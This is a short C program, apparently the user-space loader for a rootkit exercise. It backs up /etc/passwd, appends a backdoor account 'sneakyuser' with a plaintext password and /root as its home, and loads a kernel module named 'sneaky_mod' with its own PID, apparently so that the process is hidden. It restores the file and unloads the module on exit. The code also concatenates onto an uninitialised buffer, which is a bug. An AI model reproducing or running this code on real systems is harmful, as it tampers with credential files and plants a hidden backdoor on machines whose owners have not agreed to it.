#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void load_module() {
  //print process id of sneaky_process
  printf("sneaky_process pid = %d\n", getpid());
  //backup file and modify
  system("cp /etc/passwd /tmp");
  system("cat >> /etc/passwd << EOF"
          "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  //call insmod
  char cmd[128];
  int pid = getpid();
  char process_id [10];
  strcat(cmd, "insmod sneaky_mod.ko pid=");
  sprintf(process_id, "%d", pid);
  strcat(cmd, process_id);
  system(cmd);
}


void unload_and_restore() { 
  system("rmmod sneaky_mod"); 
  system("mv /tmp/passwd /etc/passwd");
  }

int main() {
  load_module();
  char input;
  //waiting for 'q' to quit
  while ((input = getchar()) != 'q') {}
  unload_and_restore();
  return EXIT_SUCCESS;
}